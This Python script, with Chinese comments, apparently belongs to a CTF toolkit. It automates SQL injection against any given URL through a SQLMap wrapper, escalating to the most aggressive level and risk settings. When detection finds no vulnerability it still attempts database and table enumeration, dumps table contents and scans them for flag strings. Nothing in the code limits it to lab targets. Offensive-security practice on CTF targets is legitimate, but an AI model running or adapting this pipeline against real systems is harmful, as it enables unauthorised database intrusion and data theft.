#!/usr/bin/env python3
"""
激进版CTF解题脚本
使用更激进的SQLMap参数来检测和利用SQL注入
"""

import asyncio
import sys
import json
import tempfile
import os
from pathlib import Path
from datetime import datetime

# 添加项目根目录到Python路径
sys.path.insert(0, str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.mcp_server.tools.sqlmap_wrapper import SQLMapWrapper


class AggressiveCTFSolver:
    """激进版CTF挑战解题器"""
    
    def __init__(self, verbose=True):
        self.logger = setup_logger("aggressive_ctf_solver", log_level="DEBUG" if verbose else "INFO")
        self.verbose = verbose
        self.sqlmap_wrapper = SQLMapWrapper()
        
    async def initialize(self):
        """初始化"""
        self.logger.info("初始化激进版CTF挑战解题器...")
        
        # 测试SQLMap连接
        connected = await self.sqlmap_wrapper.test_connection()
        if not connected:
            self.logger.error("SQLMap连接测试失败")
            return False
        
        self.logger.info("✅ SQLMap连接成功")
        return True
    
    async def solve_with_aggressive_params(self, target_url, request_file=None):
        """
        使用激进参数解决CTF挑战
        
        Args:
            target_url: 目标URL
            request_file: 请求文件路径（可选）
        """
        print("\n" + "="*80)
        print("激进版CTF解题 - 使用高级参数")
        print("="*80)
        print(f"目标: {target_url}")
        print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*80)
        
        results = {
            "solver_version": "3.0.0",
            "start_time": datetime.now().isoformat(),
            "target": target_url,
            "challenge_type": "sql-injection",
            "flags_found": [],
            "vulnerabilities": [],
            "tools_used": ["sqlmap"],
            "phases_completed": [],
            "success": False,
            "detailed_steps": []
        }
        
        try:
            # 尝试多种参数组合
            param_combinations = [
                {
                    "name": "标准检测",
                    "level": 1,
                    "risk": 1,
                    "techniques": "BEUSTQ",
                    "description": "标准参数"
                },
                {
                    "name": "中级检测", 
                    "level": 3,
                    "risk": 2,
                    "techniques": "BEUSTQ",
                    "description": "中级参数"
                },
                {
                    "name": "高级检测",
                    "level": 5,
                    "risk": 3,
                    "techniques": "BEUSTQ",
                    "description": "高级参数"
                },
                {
                    "name": "盲注检测",
                    "level": 5,
                    "risk": 3,
                    "techniques": "B",
                    "description": "专注于盲注"
                },
                {
                    "name": "时间盲注检测",
                    "level": 5,
                    "risk": 3,
                    "techniques": "T",
                    "description": "专注于时间盲注"
                }
            ]
            
            found_vulnerability = False
            
            for params in param_combinations:
                self.logger.info(f"\n尝试参数组合: {params['name']} ({params['description']})")
                print(f"\n🔍 尝试: {params['name']}")
                print(f"   参数: level={params['level']}, risk={params['risk']}, techniques={params['techniques']}")
                
                # 使用请求文件或直接URL
                if request_file and os.path.exists(request_file):
                    self.logger.info(f"使用请求文件: {request_file}")
                    # 注意：scan_with_request_file目前不支持techniques参数
                    scan_result = await self.sqlmap_wrapper.scan_with_request_file(
                        request_file,
                        level=params["level"],
                        risk=params["risk"],
                        threads=5
                    )
                else:
                    self.logger.info(f"直接扫描URL: {target_url}")
                    scan_result = await self.sqlmap_wrapper.scan(
                        target_url,
                        level=params["level"],
                        risk=params["risk"],
                        techniques=params["techniques"],
                        threads=5
                    )
                
                step_result = {
                    "step": f"scan_{params['name'].replace(' ', '_').lower()}",
                    "params": params,
                    "result": {
                        "success": scan_result.get("success", False),
                        "vulnerabilities": scan_result.get("vulnerabilities", []),
                        "vulnerability_count": len(scan_result.get("vulnerabilities", []))
                    }
                }
                
                results["detailed_steps"].append(step_result)
                
                if scan_result.get("vulnerabilities"):
                    self.logger.info(f"✅ 发现漏洞！")
                    print(f"   ✅ 发现 {len(scan_result['vulnerabilities'])} 个漏洞")
                    results["vulnerabilities"].extend(scan_result["vulnerabilities"])
                    found_vulnerability = True
                    break
                else:
                    self.logger.info(f"❌ 未发现漏洞")
                    print(f"   ❌ 未发现漏洞")
            
            if not found_vulnerability:
                self.logger.warning("所有参数组合都未发现漏洞")
                print("\n⚠️  所有检测方法都未发现SQL注入漏洞")
                print("尝试直接进行数据库枚举...")
                
                # 即使没有检测到漏洞，也尝试直接枚举
                try:
                    self.logger.info("尝试直接枚举数据库...")
                    databases = await self.sqlmap_wrapper.get_dbs(
                        target_url,
                        level=5,
                        risk=3
                    )
                    
                    if databases and len(databases) > 0:
                        print(f"✅ 发现数据库: {databases}")
                        results["phases_completed"].append("database_enumeration")
                        
                        # 检查是否有非系统数据库
                        target_dbs = [db for db in databases if "information_schema" not in db.lower() 
                                     and "mysql" not in db.lower() and "performance_schema" not in db.lower()]
                        
                        if not target_dbs:
                            target_dbs = databases
                        
                        for db in target_dbs:
                            print(f"\n🔍 枚举数据库 '{db}' 的表...")
                            tables = await self.sqlmap_wrapper.get_tables(
                                target_url,
                                db,
                                level=5,
                                risk=3
                            )
                            
                            if tables:
                                print(f"✅ 发现表: {tables}")
                                results["phases_completed"].append("table_enumeration")
                                
                                # 查找可能包含flag的表
                                flag_tables = [t for t in tables if "flag" in t.lower()]
                                if not flag_tables:
                                    flag_tables = tables[:2]  # 检查前两个表
                                
                                for table in flag_tables:
                                    print(f"\n🔍 转储表 '{db}.{table}'...")
                                    dump_result = await self.sqlmap_wrapper.dump_table(
                                        target_url,
                                        db,
                                        table,
                                        level=5,
                                        risk=3
                                    )
                                    
                                    if dump_result.get("success"):
                                        print(f"✅ 成功转储数据")
                                        results["phases_completed"].append("data_extraction")
                                        
                                        if dump_result.get("flag"):
                                            flag = dump_result["flag"]
                                            print(f"\n🎉🎉🎉 找到Flag: {flag} 🎉🎉🎉")
                                            results["flags_found"].append(flag)
                                            results["success"] = True
                                            break
                                        
                                        # 检查数据中是否包含flag
                                        data = dump_result.get("data", [])
                                        for record in data:
                                            for key, value in record.items():
                                                if isinstance(value, str):
                                                    import re
                                                    flag_patterns = [
                                                        r'flag\{[^}]+\}',
                                                        r'FLAG\{[^}]+\}',
                                                        r'ctf\{[^}]+\}',
                                                        r'CTF\{[^}]+\}',
                                                    ]
                                                    for pattern in flag_patterns:
                                                        match = re.search(pattern, value)
                                                        if match:
                                                            flag = match.group()
                                                            print(f"\n🎉🎉🎉 在数据中找到Flag: {flag} 🎉🎉🎉")
                                                            results["flags_found"].append(flag)
                                                            results["success"] = True
                                                            break
                                                    
                                                    if results["success"]:
                                                        break
                                            
                                            if results["success"]:
                                                break
                                    
                                    if results["success"]:
                                        break
                            
                            if results["success"]:
                                break
                except Exception as e:
                    self.logger.error(f"直接枚举失败: {e}")
                    print(f"❌ 直接枚举失败: {e}")
            else:
                # 发现漏洞，进行完整利用
                print("\n✅ 发现SQL注入漏洞，开始完整利用流程...")
                
                # 使用自动利用功能
                auto_exploit_result = await self.sqlmap_wrapper.auto_exploit(
                    target_url,
                    level=5,
                    risk=3,
                    techniques="BEUSTQ"
                )
                
                results["detailed_steps"].append({
                    "step": "auto_exploit",
                    "result": auto_exploit_result
                })
                
                if auto_exploit_result.get("success"):
                    results["phases_completed"].extend(["detection", "enumeration", "exploitation"])
                    
                    if auto_exploit_result.get("flag"):
                        flag = auto_exploit_result["flag"]
                        print(f"\n🎉🎉🎉 通过自动利用找到Flag: {flag} 🎉🎉🎉")
                        results["flags_found"].append(flag)
                        results["success"] = True
                    elif auto_exploit_result.get("data"):
                        print("✅ 成功获取数据（可能包含flag）")
                        results["success"] = True  # 部分成功
                        
                        # 检查数据中是否包含flag
                        for table_key, table_data in auto_exploit_result.get("data", {}).items():
                            for record in table_data:
                                for key, value in record.items():
                                    if isinstance(value, str):
                                        import re
                                        flag_patterns = [
                                            r'flag\{[^}]+\}',
                                            r'FLAG\{[^}]+\}',
                                            r'ctf\{[^}]+\}',
                                            r'CTF\{[^}]+\}',
                                        ]
                                        for pattern in flag_patterns:
                                            match = re.search(pattern, value)
                                            if match:
                                                flag = match.group()
                                                print(f"\n🎉🎉🎉 在数据中找到Flag: {flag} 🎉🎉🎉")
                                                results["flags_found"].append(flag)
                                                results["success"] = True
                                                break
                                        
                                        if results["success"]:
                                            break
                                
                                if results["success"]:
                                    break
                            
                            if results["success"]:
                                break
            
            # 生成报告
            await self._generate_report(results)
            
            return results
            
        except Exception as e:
            self.logger.error(f"解题过程中出现错误: {e}")
            import traceback
            self.logger.error(traceback.format_exc())
            
            results["error"] = str(e)
            return results
        finally:
            results["end_time"] = datetime.now().isoformat()
    
    async def _generate_report(self, results):
        """生成解题报告"""
        self.logger.info("生成解题报告...")
        
        # 计算耗时
        if results["start_time"] and results["end_time"]:
            start = datetime.fromisoformat(results["start_time"])
            end = datetime.fromisoformat(results["end_time"])
            results["duration"] = str(end - start)
        
        # 创建报告目录
        reports_dir = Path("reports")
        reports_dir.mkdir(exist_ok=True)
        
        # 生成文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = results["target"].replace("://", "_").replace("/", "_").replace(":", "_")
        report_file = reports_dir / f"aggressive_ctf_solve_{target_safe}_{timestamp}.json"
        
        # 保存JSON报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"报告已保存: {report_file}")
        
        # 打印摘要
        self._print_summary(results)
        
        return str(report_file)
    
    def _print_summary(self, results):
        """打印解题摘要"""
        print("\n" + "="*80)
        print("激进版CTF解题完成摘要")
        print("="*80)
        print(f"目标: {results['target']}")
        print(f"挑战类型: {results.get('challenge_type', 'unknown')}")
        
        if 'duration' in results:
            print(f"耗时: {results['duration']}")
        
        print(f"完成阶段: {len(results.get('phases_completed', []))}")
        print(f"使用工具: {', '.join(set(results.get('tools_used', [])))}")
        print(f"发现漏洞: {len(results.get('vulnerabilities', []))}")
        print(f"找到Flag: {len(results.get('flags_found', []))}")
        
        if results.get('flags_found'):
            print("\n🎉 发现的Flag:")
            for flag in results['flags_found']:
                print(f"  {flag}")
        
        print(f"\n成功: {'✅ 是' if results.get('success') else '❌ 否'}")
        
        # 打印详细步骤摘要
        print("\n详细步骤:")
        for i, step in enumerate(results.get('detailed_steps', []), 1):
            step_name = step.get('step', f'step_{i}')
            result = step.get('result', {})
            success = result.get('success', False)
            vuln_count = result.get('vulnerability_count', 0)
            print(f"  {i}. {step_name}: {'✅' if success else '❌'} (漏洞: {vuln_count})")
        
        print("="*80)


async def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="激进版CTF解题脚本")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-r", "--request-file", help="请求文件路径（包含HTTP请求）")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("-t", "--timeout", type=int, default=600, 
                       help="超时时间（秒，默认10分钟）")
    
    args = parser.parse_args()
    
    # 创建解题器
    solver = AggressiveCTFSolver(verbose=args.verbose)
    
    try:
        # 初始化
        print("初始化激进版CTF解题器...")
        success = await solver.initialize()
        if not success:
            print("❌ 解题器初始化失败")
            return 1
        
        print("✅ 解题器初始化成功")
        
        # 解决挑战
        results = await solver.solve_with_aggressive_params(
            target_url=args.target,
            request_file=args.request_file
        )
        
        # 根据结果返回退出码
        if results.get("success"):
            print("\n✅ 解题成功！")
            return 0
        else:
            print("\n⚠️  解题未完全成功")
            return 1
            
    except KeyboardInterrupt:
        print("\n\n解题被用户中断")
        return 130
    except Exception as e:
        print(f"\n❌ 解题失败: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    import argparse
    exit_code = asyncio.run(main())
    sys.exit(exit_code)